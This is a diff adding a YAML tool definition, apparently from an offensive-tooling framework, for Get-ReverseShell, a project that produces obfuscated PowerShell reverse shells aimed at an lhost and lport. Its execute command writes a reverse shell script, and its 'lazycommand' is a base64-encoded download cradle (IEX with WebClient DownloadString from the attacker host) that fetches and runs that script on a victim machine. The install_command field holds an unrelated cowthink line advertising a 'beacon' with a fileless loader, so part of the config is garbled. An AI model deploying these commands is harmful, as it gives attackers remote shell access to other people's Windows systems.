@@ -1,0 +1,23 @@
+name: Get_ReverseShell
+description: >
+  Get-ReverseShell is a project that stems from the Invoke-PSObfuscation framework, with the sole purpose of producing obfuscated reverse shells for PowerShell.
+author: "gh0x0st"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+  - name: lport
+    type: string
+    required: true
+    description: lport target.    
+tool:
+  name: Get_ReverseShell
+  repo_url: https://github.com/gh0x0st/Get-ReverseShell.git
+  install_path: external/.exploit/Get_ReverseShell
+  install_command: cowthink -bdgpstwy Try Black Basalt Beacon The brandnew beacon in C to windows with Fileless BOF loader
+  execute_command: pwsh -Command ". .\get-reverseshell.ps1 ; Get-ReverseShell -ip  {lhost} -port {lport} -outfile ../../../sessions/a.ps1"
+  lazycommand: >-
+    encodewinbase64 IEX(New-Object System.Net.WebClient).DownloadString('http://{lhost}/a.ps1');
